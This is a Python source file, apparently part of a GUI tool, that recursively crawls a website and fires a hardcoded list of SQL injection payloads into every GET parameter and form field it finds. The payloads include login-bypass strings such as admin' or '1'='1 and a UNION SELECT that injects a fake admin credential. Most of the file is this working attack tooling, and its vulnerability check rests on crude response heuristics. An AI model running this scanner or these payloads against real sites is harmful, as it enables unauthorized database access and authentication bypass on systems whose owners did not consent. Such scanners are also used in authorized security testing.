import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
from colorama import init, Fore


# Colorama 초기화
init(autoreset=True)

# 방문한 URL을 저장하는 세트
visited_urls = set()


def sql_injection_payload():
    return [
        "-",
        " ",
        "&",
        "^",
        "*",
        "'or ''-",
        "'or '' ",
        "'or ''&",
        "'or ''^",
        "'or ''*",
        '"-"',
        '" "',
        '"&"',
        '"^"',
        '"*"',
        '"or ""-"',
        '"or "" "',
        '"or ""&"',
        '"or ""^"',
        '"or ""*"',
        "or true--",
        '" or true--',
        "' or true--",
        '") or true--',
        "') or true--",
        "' or 'x'='x",
        "') or ('x')=('x",
        '")) or (("x"))=(("x',
        '" or "x"="x',
        '") or ("x")=("x',
        '")) or (("x"))=(("x',
        "or 1=1",
        "or 1=1--",
        "or 1=1#",
        "or 1=1/*",
        "admin' --",
        "admin' #",
        "admin'/*",
        "admin' or '1'='1",
        "admin' or '1'='1'--",
        "admin' or '1'='1'#",
        "admin' or '1'='1'/*",
        "admin'or 1=1 or ''='",
        "admin' or 1=1",
        "admin' or 1=1--",
        "admin' or 1=1#",
        "admin' or 1=1/*",
        "admin') or ('1'='1",
        "admin') or ('1'='1'--",
        "admin') or ('1'='1'#",
        "admin') or ('1'='1'/*",
        "admin') or '1'='1",
        "admin') or '1'='1'--",
        "admin') or '1'='1'#",
        "admin') or '1'='1'/*",
        '1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055',
    ]


# SQL 인젝션 페이로드 목록
payloads = sql_injection_payload()

# HTTP 요청 타임아웃 설정
timeout = 0.1  # 0.1초 후 타임아웃


# SQL 인젝션 취약점 테스트 함수
def test_sql_injection(url, params, method="get"):
    vulnerable_params = set()  # 취약한 파라미터 목록 (집합으로 변경)

    try:
        # 원래 응답과 상태 코드 저장
        original_response = requests.get(url, params=params, timeout=timeout).text
        original_status_code = requests.get(
            url, params=params, timeout=timeout
        ).status_code

        for key in params.keys():
            original_value = params[key]  # 원래 값 저장
            for payload in payloads:
                injected_params = params.copy()  # 파라미터 복사
                injected_params[key] = payload  # 페이로드 주입

                try:
                    # 요청 보내기 (GET 또는 POST)
                    if method == "get":
                        response = requests.get(
                            url, params=injected_params, timeout=timeout
                        )
                    elif method == "post":
                        headers = {"Content-Type": "application/x-www-form-urlencoded"}
                        response = requests.post(
                            url, data=injected_params, headers=headers, timeout=timeout
                        )

                    # 응답의 변경 사항을 기반으로 취약성 판단
                    if (
                        response.status_code != original_status_code  # 상태 코드 변화
                        or len(response.text)
                        != len(original_response)  # 응답 길이 변화
                        or "SQL" in response.text  # 응답에 "SQL" 포함
                        or "syntax error"
                        in response.text.lower()  # 응답에 "syntax error" 포함
                        or "error" in response.text.lower()  # 응답에 "error" 포함
                        or "warning" in response.text.lower()  # 응답에 "warning" 포함
                        or "mysql" in response.text.lower()  # 응답에 "mysql" 포함
                        or "database" in response.text.lower()  # 응답에 "database" 포함
                    ):
                        vulnerable_params.add(key)  # 취약한 파라미터 추가

                except requests.exceptions.RequestException:
                    # 예외가 발생하면 무시
                    continue

            params[key] = original_value  # 원래 값으로 복원

        return list(vulnerable_params)  # 리스트로 변환하여 반환
    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"Error accessing {url}: {e}")
        return []


def get_links_and_params(url, log_console):
    try:
        response = requests.get(url, timeout=timeout)
        soup = BeautifulSoup(response.text, "html.parser")
        links = set()
        get_params = {}  # GET 파라미터 저장
        post_params = {}  # POST 파라미터 저장

        # 페이지에서 GET 파라미터 분석
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        if query_params:
            get_params = query_params
            vulnerable = test_sql_injection(url, query_params, method="get")
            if vulnerable:
                log_console.insert(
                    "end",
                    "│   │   │"
                    + Fore.RED
                    + f"        [!] Possible SQL Injection: {', '.join(vulnerable)} is Vulnerable\n",
                )
                log_console.yview_moveto(1)
                log_console.update_idletasks()  # 즉시 업데이트하여 실시간 출력처럼 보이도록 함

        # POST 파라미터 추출 (form 태그 분석)
        forms = soup.find_all("form")
        for form in forms:
            form_method = form.get("method", "get").lower()
            action = form.get("action")
            action_url = urljoin(url, action) if action else url

            inputs = form.find_all("input")
            post_params = {
                input_tag.get("name"): input_tag.get("value")
                for input_tag in inputs
                if input_tag.get("name")
            }

            if post_params:
                if form_method == "post":
                    vulnerable = test_sql_injection(
                        action_url, post_params, method="post"
                    )
                    if vulnerable:
                        log_console.insert(
                            "end",
                            "│   │   │"
                            + Fore.RED
                            + f"        [!] Possible SQL Injection in POST: {', '.join(vulnerable)} is Vulnerable\n",
                        )
                        log_console.yview_moveto(1)
                        log_console.update_idletasks()  # 즉시 업데이트하여 실시간 출력처럼 보이도록 함

        # 모든 링크 추출
        for a_tag in soup.find_all("a", href=True):
            link = urljoin(url, a_tag["href"])
            parsed_link = urlparse(link)
            if (
                parsed_link.fragment == ""
                and link not in visited_urls
                and link.startswith(url)
            ):
                links.add(link)

        # GET/POST 파라미터 상태 출력
        if get_params:
            log_console.insert(
                "end",
                "│   │   │" + Fore.CYAN + f"        [GET] parameter: {get_params}\n",
            )
            log_console.yview_moveto(1)
            log_console.update_idletasks()  # 실시간 업데이트
        if post_params:
            log_console.insert(
                "end",
                "│   │   │" + Fore.CYAN + f"        [POST] parameter: {post_params}\n",
            )
            log_console.yview_moveto(1)
            log_console.update_idletasks()  # 실시간 업데이트

        return links
    except Exception as e:
        log_console.insert("end", "│   │" + Fore.RED + f"Error accessing {url}: {e}\n")
        log_console.yview_moveto(1)
        log_console.update_idletasks()  # 즉시 업데이트하여 실시간 출력처럼 보이도록 함
        return set()


def crawl_SQLINJECTION(url, log_console, depth=0, connection_symbol="│   "):
    if url in visited_urls:  # 이미 방문한 URL은 탐색하지 않음
        return
    visited_urls.add(url)

    # 실시간 로그 출력을 위해 log_console에 삽입
    log_console.insert("end", f"{connection_symbol}├────── {url}\n")
    log_console.yview_moveto(1)
    log_console.update_idletasks()  # 즉시 업데이트하여 실시간 출력처럼 보이도록 함

    links = get_links_and_params(url, log_console)  # log_console 인자 추가

    for idx, link in enumerate(links):
        next_connection_symbol = connection_symbol + "│   "
        if idx == len(links) - 1:
            next_connection_symbol = connection_symbol + "    "
        crawl_SQLINJECTION(link, log_console, depth + 1, next_connection_symbol)
